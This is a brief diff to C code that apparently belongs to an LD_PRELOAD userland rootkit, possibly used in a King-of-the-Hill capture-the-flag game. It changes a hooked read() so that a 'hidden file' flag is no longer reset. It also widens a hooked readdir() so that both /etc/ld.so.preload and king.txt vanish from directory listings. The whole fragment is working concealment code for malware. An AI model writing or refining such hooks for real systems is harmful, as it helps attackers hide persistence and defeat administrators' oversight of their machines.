@@ -57,7 +57,7 @@ ssize_t read(int fd, void *buf, size_t count) {
                 memset(buf, 0, count);
                 strncpy(buf, message, count);
 
-                is_reading_hidden_file = 0; // Reset flag after reading
+                // is_reading_hidden_file = 0; // Reset flag after reading
                 return count; // Return the number of bytes written
             }
         }
@@ -130,8 +130,7 @@ struct dirent *readdir(DIR *dirp) {
         }
 
         // Hide /etc/ld.so.preload and /root/king.txt
-        // if (strcmp(entry->d_name, "ld.so.preload") == 0 || strcmp(entry->d_name, "king.txt") == 0) {
-        if (strcmp(entry->d_name, "ld.so.preload") == 0) {
+        if (strcmp(entry->d_name, "ld.so.preload") == 0 || strcmp(entry->d_name, "king.txt") == 0) {
             continue; // Skip this entry
         }
 
